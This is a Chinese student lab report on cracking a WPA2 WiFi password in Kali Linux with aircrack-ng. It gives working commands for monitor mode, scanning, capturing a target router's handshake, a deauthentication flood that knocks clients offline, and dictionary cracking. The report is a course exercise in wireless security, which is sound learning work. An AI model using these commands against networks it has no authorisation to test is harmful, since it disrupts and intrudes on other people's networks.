# WIFI渗透--作业1： WIFI密码破解

## 实验准备

1.虚拟机 kali Linux

2.有监听功能的网卡 RT3070

3.aircrack-ng kali内置的无线攻击软件

## 实验过程

#### 1.虚拟机安装无线网卡

- 分配无线网卡给linux（主要网卡现在不能连接WiFi）

  ![分配网卡](img\分配网卡.png)

  ![查看网卡2](img\查看网卡2.png)

- 开启网卡监听模式，在监听模式下，无线网卡的名称已经变为了wlan0mon

  ![开启监听1](img\开启监听1.png)

  ![开启监听2](C:\Users\DELL\Desktop\大三下课程作业\移动互联网安全\WiFi渗透-魏迎迎-2019302120088\img\开启监听2.png)

- 重启一下网卡

  ```bash
   sudo ifconfig wlan0mon down
   sudo iwconfig wlan0mon mode monitor
   sudo ifconfig wlan0mon up 
  ```

  ![重启网卡](img\重启网卡.png)

#### 2.探测

- 扫描周围无线网络

  什么也没找到

- ```bash
  sudo airodump-ng wlan0mon
  ```

  ![扫描wifi](img\扫描wifi.png)

- 重新选择USB3.0(XHCI)控制器,重新探测，成功。

  ![更改usb设置](img\更改usb设置.png)

- 观察到**ESSID**是周围wifi的名字，最左侧的**BSSID**是这些wifi对应的mac地址。**ENC**是加密方式。**CH**是工作频道。

  可以看到基本都是WPA2的，很少有WPA和WEP,因为这两个的安全性都较WPA2差。

  ![探测wifi](img\探测wifi.png)

- 接下来要破解图中的FAST_1041BA。可以看到它的mac地址是1C:FA:68:10:41:BA，它的工作频道是1。

#### 3.利用airodump-ng进行抓包

- 使用airodump-ng这个工具进行抓包，可以看到有三个连接（客户端是电脑、手机以及ipad）。

  ```bash
  #--bssid 是路由器的mac地址
  #-w 是写入到文件longas中
  #-c 11 是频道11
  #--ivs 是只抓取可用于破解的IVS数据报文
  sudo airodump-ng –w longas -c 1 --bssid 1C:FA:68:10:41:BA --ivs wlan0mon
  ```

  ![抓包](img\抓包.png)

#### 4.利用crunch生成字典进行攻击

- 利用以下命令洪水攻击，设置攻击15次。

- 为了获得破解所需的WPA2握手验证的整个完整数据包，发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，这样就有机会捕获到包含WPA2握手验证的完整数据包了。

  ```bash
  #新开一个shell
  #-0 采用deauth攻击模式，一直不断的攻击，类似于拒绝服务攻击，占满你的握手请求通道，其他的连接进不来，也可以让当前所有连接断开
  #-a 后跟路由器的mac地址
  #-c 后跟客户端的mac地址
    sudo aireplay-ng -0 15 –a 1C:FA:68:10:41:BA  -c BE:A9:57:76:88:26 wlan0mon
  
  ```

  ![洪水攻击](img\洪水攻击.png)

- 停掉洪水攻击，连接一下模拟别人连接，出现WPA handshake就表示成功。

  ![出现WPA handshake](img\出现WPA handshake.png)

#### 5.利用aircrack-ng进行爆破

- 抓到握手包那么就可以用密码字典进行爆破了(wifi-1.cap)

- ls查看抓包名称---longas-01.ivs

  ![查看包名字](img\查看包名字.png)

- 准备一个字典爆破---code.txt(为了节省时间字典中直接加入密码)

  ```bash
  sudo aircrack-ng -w code.txt longas-04.ivs
  ```

  ![爆破成功](img\爆破成功.png)



# 实验中遇到的问题

 1.扫描周围WiFi什么也没找到

**解决方法：更改usb设置为USB 3.0 (xHCI)控制器**

# 参考

[使用Aircrack-ng进行wifi渗透](https://www.jianshu.com/p/fd16236057df)

# 总结

**WLAN的设备**
WLAN主要由接入点（Access Point，AP）和客户端（Station，STA）组成
**接入点AP**

- 类似于有线局域网中的交换器
- 负责管理客户端，协调无线与有线网络之间的通信
  **客户端STA**
- 安装有无线网卡的计算机

**WEP（有线等效保密）认证过程：**

1. 客户端向接入点发送认证请求
2. 接入点发回一段明文
3. 客户端利用事先共享的密钥加密这段明文（对称），并再次发出认证请求
4. 接入点对数据包进行解密，比较明文，来决定是否接受请求